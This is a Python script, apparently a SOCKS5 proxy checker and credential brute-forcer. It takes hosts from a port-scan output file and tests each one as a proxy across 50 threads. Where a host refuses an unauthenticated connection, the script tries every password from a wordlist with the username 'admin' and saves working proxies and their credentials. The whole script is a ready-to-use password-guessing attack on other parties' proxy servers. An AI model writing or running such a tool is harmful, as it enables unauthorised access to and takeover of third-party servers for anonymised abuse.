import requests
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings("ignore")

# 测试代理的函数
def test_proxy(proxy):

    try:
        response = requests.get('https://www.baidu.com/', proxies={'http': f"socks5://{proxy}", 'https': f"socks5://{proxy}"}, timeout=6,verify=False)
        if response.status_code == 200:
            print(f'Working proxy: {proxy}')
            with open('ok.txt', 'a') as file:
                file.write(f'socks5://{proxy}\n')
    except :
        # 打开pass.txt，读取内容，去除换行，并且返回到一个列表
        with open('pass.txt', 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
        for pass_dic in passwords :
            try :
                response2 = requests.get('https://www.baidu.com/', proxies={'http': f"socks5://admin:{pass_dic}@{proxy}", 'https': f"socks5://admin:{pass_dic}@{proxy}"}, timeout=6,verify=False)
                if response2.status_code == 200:
                    print(f'Working proxy: {proxy}')
                    with open('ok.txt', 'a') as file:
                        file.write(f'socks5://admin:{pass_dic}@{proxy}\n')
            except:
                pass
        print(f'Error with proxy: {proxy}')

# 主函数
def main():
    # 从文件读取代理列表
    with open('port_open.txt', 'r') as file:
        proxies = [line.strip() for line in file.readlines()]

    # 使用线程池测试代理
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(test_proxy, proxies)

# 程序入口点
if __name__ == '__main__':
    main()
    
